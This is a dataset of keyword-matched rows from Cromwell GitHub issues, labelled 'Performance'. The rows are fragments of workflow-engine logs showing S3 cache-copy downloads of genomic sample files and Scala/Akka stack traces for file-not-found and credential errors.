s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:121619,cache,cacheCopy,121619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi; 1608596974147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi; 1608596976528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz; 1608596979652,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:10677,cache,cacheCopy,10677,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi; 1608597270319,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi; 1608597272885,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz; 1608597275740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:91083,cache,cacheCopy,91083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi; 1608597297393,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi; 1608597299791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz; 1608597301211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:97929,cache,cacheCopy,97929,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz.tbi; 1608597210297,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi; 1608597211840,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi; 1608597213995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-38/cacheCopy/SR00c.HG01799.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:74865,cache,cacheCopy,74865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi; 1608597627949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi; 1608597629983,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:191057,cache,cacheCopy,191057,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz.tbi; 1608597279104,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi; 1608597281347,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz; 1608597283995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:93576,cache,cacheCopy,93576,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"883 cromwell-system-akka.dispatchers.backend-dispatcher-183 INFO - TesAsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Job bccmdfdd6o377kru9q6g is complete; 2018-06-07 13:13:04,883 cromwell-system-akka.dispatchers.backend-dispatcher-183 INFO - TesAsyncBackendJobExecutionActor [UUID(af282f7a)wf_hello.hello:NA:1]: Status change from Running to Complete; 2018-06-07 13:13:06,346 cromwell-system-akka.dispatchers.engine-dispatcher-59 ERROR - WorkflowManagerActor Workflow af282f7a-1e95-4390-8cf7-c3bbd93b10b2 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.nio.file.NoSuchFileException: /Users/tdyar/workspace/cromwell/cromwell-executions/wf_hello/af282f7a-1e95-4390-8cf7-c3bbd93b10b2/call-hello/execution/rc; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743:6940,concurren,concurrent,6940,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743,1,['concurren'],['concurrent']
Performance,"89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File.byteArray(File.scala:81); at better.files.File.contentAsString(File.scala:91); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply$mcI$sp(LocalBac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:5036,concurren,concurrent,5036,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,"8:47,222 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowManagerActor Starting workflow UUID(948bf608-f91b-46a7-b892-86454be067fd); 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowManagerActor Successfully started WorkflowActor-948bf608-f91b-46a7-b892-86454be067fd; 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.eff",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:1753,concurren,concurrent,1753,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance,"8d8048main.low_genotyping_quality_sample_list:NA:1]: Unrecognized ru; ntime attribute keys: shortTask, dx_timeout; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = 9675960412B5394D5D0816ED198FB6EB.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.white_brits_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 3C891C9939496580DDF747805F991E06, file = AAFFF98AC7D58B07E7CE25978A906B00.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.low_genotyping_quality_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,02] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_mismatch_sample_list:-1:1-20000000015 [788d8048main.sex_mismatch_sample_list:NA:1]: Unrecognized runtime attribute keys; : shortTask, dx_timeout; [2022-12-15 21:28:04,02] [info] BT-322 788d8048:main.sex_mismatch_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 03340ED60152B24B7D0988669F47CF2B, file = EB6A9909BDF3705B7BB543E4096DA08A.; [2022-12-15 21:28:04,02] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.sex_mismatch_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,35] [info] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: /home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main; /788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-915037270/load_shared_cov",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:36474,cache,cache,36474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,9-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.scala:11); at cromwell.backend.impl.jes.JesWorkflowPaths.toJesCallPaths(JesWo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1270,concurren,concurrent,1270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
